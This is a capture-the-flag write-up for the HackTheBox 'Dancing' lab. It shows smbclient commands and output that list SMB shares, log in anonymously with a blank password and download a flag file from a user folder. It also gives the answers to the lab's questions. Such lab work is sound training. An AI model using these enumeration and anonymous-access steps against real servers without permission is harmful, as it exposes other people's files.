# HackTheBox: Dancing:
---
URL: https://app.hackthebox.com/starting-point \
Author: HackTheBox
### Challenge Description:
- What does the 3-letter acronym SMB stand for?
- What port does SMB use to operate at?
- What is the service name for port 445 that came up in our Nmap scan?
- What is the 'flag' or 'switch' we can use with the SMB tool to 'list' the contents of the share?
- How many shares are there on Dancing?
- What is the name of the share we are able to access in the end with a blank password?
- What is the command we can use within the SMB shell to download the files we find?
- Submit root flag
### Solution:
first we connected to the target server using the smbclient application

```
smbclient -L 10.129.138.191 -U anonymous
Enter WORKGROUP\anonymous's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
SMB1 disabled -- no workgroup available
```

Here we can see the WorkShares share that we can connect to using the following command:

```
smbclient //10.129.138.191/WorkShares/ -U anonymous
```

We can then log in with the anonymous user and a blank password as credentials

```
Enter WORKGROUP\anonymous's password:
Try "help" to get a list of possible commands.
```

Next we checked through each folder to find the flag.txt file

```
smb: \> ls
  .                                   D        0  Mon Mar 29 08:22:01 2021
  ..                                  D        0  Mon Mar 29 08:22:01 2021
  Amy.J                               D        0  Mon Mar 29 09:08:24 2021
  James.P                             D        0  Thu Jun  3 08:38:03 2021

                5114111 blocks of size 4096. 1732530 blocks available
smb: \> cd Amy.J
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 09:08:24 2021
  ..                                  D        0  Mon Mar 29 09:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 11:00:37 2021

                5114111 blocks of size 4096. 1732530 blocks available
smb: \Amy.J\> cd ../
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 08:38:03 2021
  ..                                  D        0  Thu Jun  3 08:38:03 2021
  flag.txt                            A       32  Mon Mar 29 09:26:57 2021

                5114111 blocks of size 4096. 1732530 blocks available
```

and finally issued the get command to download to the local box

```
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
```

We used cat to extract the flag and successfully submitted it.

---

Notes:
